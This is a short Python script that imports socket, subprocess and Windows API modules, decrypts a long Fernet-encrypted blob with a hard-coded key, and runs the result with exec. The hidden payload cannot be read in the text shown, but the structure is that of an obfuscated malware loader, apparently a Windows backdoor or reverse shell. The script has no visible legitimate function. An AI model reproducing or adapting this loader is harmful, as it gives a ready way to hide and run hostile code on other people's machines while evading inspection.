import os,sys,socket,subprocess,threading,win32gui,win32con,win32event,win32api,winerror
from cryptography.fernet import Fernet
import os
import sys
key = b'EiAROz0rGoEEdqDPwqTcy16FIYVHcWhxIxSjVs29VFs='
f_obj = Fernet(key)
enc_pay = b'gAAAAABepEf5s2QtlOrgmJYMml3r-OVjjoAHbxZDlpp-5A9cJIr0wl-dVXwHVp4RmHhfHvvbTxwIHkrTchciTJGQgrSK63NKImfjHL9_iihj7dVbdWyMKZXNn6t95q1CeidB3gfGYl4F5onCA1geIpvfxq_gr_T334V7WSso2yDE3GLEZxuZWtQxrosISDpBiCfAYgDZp1ivLoUCsRwXqNmIPAvr7UbJsvBtz7w5J2kDwHkO9BJCLLo6lkc7Zk22LuCJt9umbI5fBfeRI1uUwXQEFpAyfTvLPtkFbiwq3dse7GIGRoCIF99PPH0jTWr0_KYeImVcDEe_LFozCi7JvSKXG-eFn6l_Fd9b1hovvCwwwiiDOpyVRPNBw58WQ1mZaO7n8XN-1yPdm3ckJTB8AMAfqKrxwjJ0aVsHgtV8lB4Waekb8FPV8SWC3L7Jv0wrWB9NTFT78ze6C6UM_e-f0KNQirjOy-6XxaXClxNnRiCRvWZ6SpF9yN_HHtjzy1Qmk-hBLUbjcuVgCMthEAkgriBg8bsIkyy8qh1CrnJtzTxMchD8wmGHybt1Qq1lsrSz3KlcXPZyMMKj8_a--46azcJ6y4Y0qVPowLV52mF_Q6ozcbZgnNqOIrta9iZuYo60nR24Pl1hG-GrrKIAh1WDFYFSFRDdxOYOx5FnI_PLTBLO5ZBvo2BqN_-SBM6nEVPWBpu8wQUiHtbTXd61YYD98aNa_KxAqqJxwKT2u5svmXYifllFZDlrgZhR2k8338l6gsTEGIbPpeRgD1K0VffLnPGBuT-ABxG6_O2bfYjCTEtegRAGik0p7zW3cS1Ze13XpCxZb6s9mS4_rVgOYLZ4hE_tpMbYg4jTMom_YhoAGDcko2o0ByhXEVyNQkxuhVLqtyK872bXLMBhUmEYC_1AyEIkvOyBWJl7v51QJbRN8iwo_mlZofJvoxnGHIEtBbSO8QjmeDUwM3vMy7BossVn9r6eKozVaHRvY9yBJeyN9naZDnZJHZ1A0g715n06jpmDQ07SM_zhQ3veljODOUE8GBhtbKkGuiki0QWoDWSnjWq92xEzyhv9cXCMRzIKKiuBcq18dZHlvp4jh7UEL0AR7HnOvRrGjFRRHngK8SU0KEs1HwqGAEGhIdZ1Ml8C6pUUjJ-_bLKwYAiAsbLK3iootBWMfIuw9GVMCXZG2VUF6HJFRG7dH2Oe08VdhYddMbTDAsRRZcAFqqcL7E9ydtxRQoJrthaNHwM9wDdVl923htUqqkXpg436vpuHvNxfloMvrG-aFHX3Qwtl42rBEBknMVyaQiAAtxkTnBcNakMyL8AFdtbpgsZTamDAG2yEKBYQ31xE5iSVBmL3k4VldOryI9VzFeCstTNHsbt6hM3WG9iVk8Dxg_7kn7MDVfEE8dAxUkg_7fVTXwAWYYN1zrAlXVmwvvmAjGLFYxTEMgr7Fq-Lyo9Ee5ZA_mSLHL8w4tLKv8dD74aLj87BfEwqhilTC0nxxCfHvq0QgSRmFx2b9zg5s1BeX6-EIun8lrVNfQ6MrgoGYGhyA_wdRNFBHV4LfIoJTjHuaUL4t8AVyrf0hOH8cVTfXOMPT1yTyru2Nq9Mmq4APp_z3iIOFswIGBqvaoxRi9nfq9tsJL5X-O14Ehk3pmKQCl7yxu7giPxQTSTZtqp0z0vj3cy4vAKY4wh4Wz7oDWz_Llu2ivDIeQwpeujXeJInCKCi_4g02iqe7iFzQtfuy8r4lFSbzZPXzLgrL-oqlKOrFygz01BWk42yVdJnJ0xE4lsGcKg3rJPU8SSmj9e6R9DNstZaWN5ll8uphBLXsSCRBaIdEzadc7axZ0cLn8JNS-62pohTn8fkyj_QieExRobdXuo0AtBgzxGGonRH_EO4o8sGprHU45sDxJTux8iMrFamzAs_lnBoHGINGXjN6mpltrM7fxp7lUlrpTFRKvCkYnBvVL2MkPrZNVsEdWlqbUBxY-aIuI0EcE68-XDNSE_wKTRQeUCuGyrE25lx1d2GAaWcm9XDJBVO0EtNP0NTl5RtihPskhYn3RmZgmGHSr0FwuOVPlZu5T3mjlAWqXcyRQ4QRg-8Zo3lj_eDvHSJ50vZerD0nRFMlkgnIGzINMRGJjcVQUHM008iExlwlZ-v3Z4H3Fl0x7f8l6cYpx-9rhuO2QKtBX2EFufwLRFlXC3YjxyIrqCquAbdQwEZ2v-5cKWlMbbfdm7MjjdeqOGXLbXJ_6B_tAMJDKxfg5Ss8_wwDvydbjhrZRDs0PuCd4SJ1qxkfeeEye0N9PdkD4KKXPIuPDM3xnq6B2GDCCP9hjF6MmvUSmATk3LXAZQ-M9RPgppMuFtTawoSOn0H1QBb3M3PQ2ns2pMHUy19Fdyzm-eZsVtP-X_k5fji35o4u4SyGxB6HUl5gwEGMKkXfNsmu4p1jDW3xSRDWqD6D23NFDCZm39-k4y81xRbZVcyyT1AKRIm3xdsnrZ_cORb0b_6v-8zq09kPjUIzteD5jqkTGep5uGeztHvwfTj_oepC00bvAty1liquFX_bizeVnQzxfuGmcFk5A5AAmjxZQis7F7jLWuLt4celnmT8tlf-h1j6ZNF7OVStMyNdcK4dhZmdcFvk6skSggwb0sq5cI_81gLsuogM9dy3DF_irQjN2p0PXVVdNPMz8hoEMmgZdlgus9Z_5Hq8VLXXrMDqmsQX8MpA5i4EP7-7jTU_tqE13dSxm5SMAAE7qFBLowUgss0zItXHJEBUdKgm_BGmpW6yv7fwqVycSNWqh0SX4ynPMTlMMjdW6fuDFbgGGZBvWR0FR50RE_19x5QQUOQvO5DjqNGIkhV'
exec(f_obj.decrypt(enc_pay))